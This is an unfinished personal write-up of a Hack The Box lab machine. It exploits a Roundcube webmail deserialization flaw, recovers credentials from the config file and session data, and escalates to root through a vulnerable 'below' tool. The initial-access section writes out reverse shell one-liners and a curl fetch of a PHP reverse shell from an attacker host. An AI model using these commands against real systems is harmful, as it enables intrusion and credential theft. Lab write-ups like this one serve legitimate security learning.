Tags: #Linux/Ubuntu #Easy #Nginx #Insecure-PHP-Object-Deserialization 
# **Nmap Results**

```text
Nmap scan report for 10.10.11.77
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```
<br>
<br>

# **Service Enumeration**
Add domain name to /etc/hosts file

First look at the site:

![[Pasted image 20250713215909.png]]

We are given credentials in the machine description, which are valid for this form. 

Dashboard site:

![[Pasted image 20250713220038.png]]

The "About" button on the bottom left reveals service and version information. This site is running **Roundcube Webmail 1.6.10** which has a CVE ID of **CVE-2025-49113**. 

> [!info] Explanation of the Vulnerability
> Lorem Ipsum
>
> More information can be found on [this](https://www.offsec.com/blog/cve-2025-49113/) blog post

There's a POC script on [GitHub](https://github.com/hakaioffsec/CVE-2025-49113-exploit) which we will use. 
<br>
<br>
# **Exploitation**
## **Initial Access**
Multiple reverse shell one-liners such as `bash -i >& /dev/tcp/<ip>/<port> 0>&1`, `nc <ip> <port> -e sh`, and a python variant did not work, however I discovered that `curl` is available. We can use this to our advantage by having the machine fetch a PHP reverse shell script and then executing it immediately (`curl http://<attacker-ip>:<port>/exploit.php)

After uploading the malicious PHP object with our command, we set up a Python server and then our listener:

![[Pasted image 20250722144550.png]]

We're now logged in as www-data.

It's confirmed that we're in a docker container by the output of `ps -p 1 -o comm=`, which yields **init.sh**. If we weren't in one, we'd see **systemd**.

`ps aux` reveals an interesting process: 

```bash
mysql        143  0.0  2.8 1408716 114380 ?      Sl   15:09   0:02 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock
```

There's an instance of MariaDB/MySQL running in the background. 

Creds are found in `/var/www/html/roundcube/config/config.inc.php`:

```php
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

```

After logging in, the process appears to hang, but we are still able to input commands. This is because of our extremely unstable shell. We have to type enter and ';' a few times and then our command for it to work.

Within the **"roundcube"** database, there's a table **"users"**, with users and passwords:

![[Pasted image 20250722162817.png]]

The hashes don't seem to match the format for any hash type, which is very odd. 

**NOTE**: I've just discovered that there's a Metasploit module for the earlier vulnerability, which I will use for a more stable shell, plus `script /dev/null -c bash`.

There's a table called **session**, and inside we find some base64 data. After decoding it, we find Jacob's PHP encoded session:

![[Pasted image 20250723164422.png]]

If you look closely, we see his password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`, but it doesn't appear to work, and it's not encoded by any means. The online hash type identifier at hashes.com was unable to detect the hash type. We'll have to keep looking around to find more clues

In the same file we found the SQL creds, there's also a "des-key":

```php
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

So Jacob's password is encrypted with DES, specifically Triple DES (3DES) given that the key length is 24 bytes, and the normal key length for a single DES key is 8 bytes. 

EXPLAIN HOW TO DECRYPT PASSWORD HERE. THE RESULT WAS `595mO8DmwGeD`

Logging in with SSH with this password was unsuccessful, but we were able to use `su` to log in locally. It also worked in the roundcube webmail portal, and we can see the messages in his inbox, of which he has 2. The one that interests us is this one:

![[Pasted image 20250724134554.png]]

This password seems to have worked in SSH, and we are now the real Jacob instead of the one we `su`'d into in the docker container.
<br>
<br>
# **Privilege Escalation**  
Output of `sudo -l`:

![[Pasted image 20250724135439.png]]

This tells us we can run `below` as root, except if certain arguments are present, like the `--config` flag, or debug, etc.

**Below** is a system profiler/activity monitor program for linux. When we run it, the version is displayed and tells us it's **0.8.0**. There happens to be a CVE for that, linked [here](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)

After execution, we are root.
<br>
<br>
# Skills Learned
* The usual way to spawn a more stable shell is using python with `python3 -c 'import pty;pty.spawn("/bin/bash")'`. However, in situations where python is unavailable, another solid method is using the `script` command like so: `script /dev/null -c bash`. This command is designed to create stable PTYs, but it also logs everything to a file, which we bypass by just passing /dev/null
<br>
<br>
# Proof of Pwn
https://labs.hackthebox.com/achievement/machine/391579/672